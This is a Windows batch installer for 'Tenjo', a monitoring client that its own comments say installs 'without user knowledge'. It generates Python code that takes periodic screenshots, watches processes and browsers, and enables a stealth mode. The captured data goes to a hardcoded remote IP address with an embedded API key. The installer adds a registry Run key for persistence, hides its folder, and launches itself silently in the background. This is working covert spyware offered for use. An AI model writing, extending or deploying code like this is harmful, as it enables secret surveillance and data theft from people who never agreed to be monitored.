@echo off
REM Tenjo Stealth Installer for Windows
REM This script installs the monitoring client silently without user knowledge

setlocal enabledelayedexpansion

REM Configuration
set "APP_NAME=TenjoClient"
set "INSTALL_DIR=%USERPROFILE%\.tenjo"
set "SERVICE_NAME=TenjoMonitor"
set "PYTHON_VENV=%INSTALL_DIR%\.venv"
set "SERVER_URL=http://103.129.149.67"
REM set "SERVER_URL=http://127.0.0.1:8000"
set "API_KEY=tenjo-api-key-2024"

echo [%date% %time%] Starting Tenjo stealth installation...

REM Function to check if Python is installed
python --version >nul 2>&1
if errorlevel 1 (
    echo [%date% %time%] ERROR: Python is not installed. Please install Python 3.8+ first.
    pause
    exit /b 1
)

REM Create installation directory
echo [%date% %time%] Creating installation directory...
if exist "%INSTALL_DIR%" rmdir /s /q "%INSTALL_DIR%"
mkdir "%INSTALL_DIR%"
mkdir "%INSTALL_DIR%\src\core"
mkdir "%INSTALL_DIR%\src\modules"
mkdir "%INSTALL_DIR%\src\utils"
mkdir "%INSTALL_DIR%\data\screenshots"
mkdir "%INSTALL_DIR%\data\pending"
mkdir "%INSTALL_DIR%\logs"

REM Create Python virtual environment
echo [%date% %time%] Creating Python virtual environment...
python -m venv "%PYTHON_VENV%"
call "%PYTHON_VENV%\Scripts\activate.bat"

REM Install required packages
echo [%date% %time%] Installing required Python packages...
pip install --quiet --upgrade pip
pip install --quiet mss pillow requests psutil pywin32 pygetwindow

REM Create main application file
echo [%date% %time%] Installing application files...
(
echo #!/usr/bin/env python3
echo import sys
echo import os
echo.
echo # Add src to path
echo sys.path.insert^(0, os.path.join^(os.path.dirname^(__file__^), 'src'^)^)
echo.
echo from core.tenjo_client import TenjoClient
echo.
echo if __name__ == "__main__":
echo     client = TenjoClient^(^)
echo     client.start^(^)
) > "%INSTALL_DIR%\main.py"

REM Create config file
(
echo import os
echo import platform
echo import uuid
echo.
echo class Config:
echo     # Server configuration
echo     SERVER_URL = "%SERVER_URL%"
echo     API_KEY = "%API_KEY%"
echo     
echo     # Client identification
echo     CLIENT_ID = str^(uuid.uuid4^(^)^)
echo     HOSTNAME = platform.node^(^)
echo     
echo     # Paths
echo     BASE_DIR = os.path.dirname^(os.path.dirname^(os.path.dirname^(__file__^)^)^)
echo     DATA_DIR = os.path.join^(BASE_DIR, 'data'^)
echo     SCREENSHOTS_DIR = os.path.join^(DATA_DIR, 'screenshots'^)
echo     PENDING_DIR = os.path.join^(DATA_DIR, 'pending'^)
echo     LOGS_DIR = os.path.join^(BASE_DIR, 'logs'^)
echo     
echo     # Settings
echo     SCREENSHOT_INTERVAL = 60  # seconds
echo     HEARTBEAT_INTERVAL = 30   # seconds
echo     STEALTH_MODE = True
echo     
echo     # Create directories
echo     os.makedirs^(SCREENSHOTS_DIR, exist_ok=True^)
echo     os.makedirs^(PENDING_DIR, exist_ok=True^)
echo     os.makedirs^(LOGS_DIR, exist_ok=True^)
) > "%INSTALL_DIR%\src\core\config.py"

REM Create main client file
(
echo import time
echo import threading
echo import logging
echo import os
echo from datetime import datetime
echo.
echo from .config import Config
echo from ..modules.screen_capture import ScreenCapture
echo from ..modules.process_monitor import ProcessMonitor
echo from ..modules.browser_monitor import BrowserMonitor
echo from ..modules.stream_handler import StreamHandler
echo from ..utils.api_client import APIClient
echo from ..utils.stealth import StealthManager
echo.
echo class TenjoClient:
echo     def __init__^(self^):
echo         self.setup_logging^(^)
echo         self.api_client = APIClient^(Config.SERVER_URL, Config.API_KEY^)
echo         self.stealth_manager = StealthManager^(^)
echo         
echo         # Initialize modules
echo         self.screen_capture = ScreenCapture^(self.api_client^)
echo         self.process_monitor = ProcessMonitor^(self.api_client^)
echo         self.browser_monitor = BrowserMonitor^(self.api_client^)
echo         self.stream_handler = StreamHandler^(self.api_client^)
echo         
echo         self.running = False
echo         
echo     def setup_logging^(self^):
echo         log_file = os.path.join^(Config.LOGS_DIR, 'tenjo_client.log'^)
echo         logging.basicConfig^(
echo             level=logging.INFO,
echo             format='%%^(asctime^)s - %%^(levelname^)s - %%^(message^)s',
echo             handlers=[
echo                 logging.FileHandler^(log_file^),
echo                 logging.StreamHandler^(^)
echo             ]
echo         ^)
echo         
echo     def start^(self^):
echo         """Start the monitoring client"""
echo         try:
echo             logging.info^("Starting Tenjo monitoring client..."^)
echo             
echo             # Enable stealth mode
echo             if Config.STEALTH_MODE:
echo                 self.stealth_manager.enable_stealth_mode^(^)
echo             
echo             # Register client with server
echo             if not self.api_client.register_client^(^):
echo                 logging.error^("Failed to register with server"^)
echo                 return
echo                 
echo             self.running = True
echo             
echo             # Start monitoring threads
echo             threading.Thread^(target=self.heartbeat_loop, daemon=True^).start^(^)
echo             threading.Thread^(target=self.screen_capture.start_capture_loop, daemon=True^).start^(^)
echo             threading.Thread^(target=self.process_monitor.start_monitoring, daemon=True^).start^(^)
echo             threading.Thread^(target=self.browser_monitor.start_monitoring, daemon=True^).start^(^)
echo             threading.Thread^(target=self.stream_handler.start_streaming, daemon=True^).start^(^)
echo             
echo             logging.info^("All monitoring modules started successfully"^)
echo             
echo             # Main loop
echo             while self.running:
echo                 time.sleep^(1^)
echo                 
echo         except KeyboardInterrupt:
echo             logging.info^("Shutting down client..."^)
echo             self.stop^(^)
echo         except Exception as e:
echo             logging.error^(f"Fatal error: {e}"^)
echo             
echo     def heartbeat_loop^(self^):
echo         """Send periodic heartbeat to server"""
echo         while self.running:
echo             try:
echo                 self.api_client.send_heartbeat^(^)
echo                 time.sleep^(Config.HEARTBEAT_INTERVAL^)
echo             except Exception as e:
echo                 logging.error^(f"Heartbeat error: {e}"^)
echo                 time.sleep^(10^)
echo                 
echo     def stop^(self^):
echo         """Stop the monitoring client"""
echo         self.running = False
echo         logging.info^("Tenjo client stopped"^)
) > "%INSTALL_DIR%\src\core\tenjo_client.py"

REM Copy source files if they exist, otherwise create placeholders
if exist "src\modules\screen_capture.py" (
    echo [%date% %time%] Copying source files...
    copy "src\modules\screen_capture.py" "%INSTALL_DIR%\src\modules\" >nul
    copy "src\modules\process_monitor.py" "%INSTALL_DIR%\src\modules\" >nul
    copy "src\modules\browser_monitor.py" "%INSTALL_DIR%\src\modules\" >nul
    copy "src\modules\stream_handler.py" "%INSTALL_DIR%\src\modules\" >nul
    copy "src\utils\api_client.py" "%INSTALL_DIR%\src\utils\" >nul
    copy "src\utils\stealth.py" "%INSTALL_DIR%\src\utils\" >nul
) else (
    echo [%date% %time%] Creating placeholder modules...
    echo # Placeholder module > "%INSTALL_DIR%\src\modules\__init__.py"
    echo # Placeholder module > "%INSTALL_DIR%\src\utils\__init__.py"
    echo # Placeholder module > "%INSTALL_DIR%\src\core\__init__.py"
    echo # Placeholder module > "%INSTALL_DIR%\src\modules\screen_capture.py"
    echo # Placeholder module > "%INSTALL_DIR%\src\modules\process_monitor.py"
    echo # Placeholder module > "%INSTALL_DIR%\src\modules\browser_monitor.py"
    echo # Placeholder module > "%INSTALL_DIR%\src\modules\stream_handler.py"
    echo # Placeholder module > "%INSTALL_DIR%\src\utils\api_client.py"
    echo # Placeholder module > "%INSTALL_DIR%\src\utils\stealth.py"
)

REM Create startup script
echo [%date% %time%] Creating startup script...
(
echo @echo off
echo cd /d "%INSTALL_DIR%"
echo "%PYTHON_VENV%\Scripts\python.exe" main.py
) > "%INSTALL_DIR%\start_tenjo.bat"

REM Create Windows service installer script
(
echo @echo off
echo REM Install Tenjo as Windows service
echo sc create %SERVICE_NAME% binPath= "\"%INSTALL_DIR%\start_tenjo.bat\"" start= auto
echo sc description %SERVICE_NAME% "Tenjo Monitoring Service"
echo sc start %SERVICE_NAME%
echo echo Service installed and started successfully
) > "%INSTALL_DIR%\install_service.bat"

REM Add to Windows startup (Registry method - more stealth)
echo [%date% %time%] Adding to Windows startup...
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "TenjoMonitor" /t REG_SZ /d "\"%INSTALL_DIR%\start_tenjo.bat\"" /f >nul 2>&1

REM Hide installation directory
echo [%date% %time%] Applying stealth configurations...
attrib +h "%INSTALL_DIR%" >nul 2>&1

REM Start the application
echo [%date% %time%] Starting Tenjo monitoring service...
start /b "" "%INSTALL_DIR%\start_tenjo.bat"

echo.
echo [%date% %time%] ✅ Tenjo monitoring client installed successfully!
echo [%date% %time%] 📍 Installation directory: %INSTALL_DIR% (hidden)
echo [%date% %time%] 🔄 Service will start automatically on boot
echo [%date% %time%] 📊 Monitoring data will be sent to: %SERVER_URL%
echo.
echo Installation completed. The monitoring service is now running silently.
echo To uninstall: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "TenjoMonitor" /f ^&^& rmdir /s /q "%INSTALL_DIR%"

pause
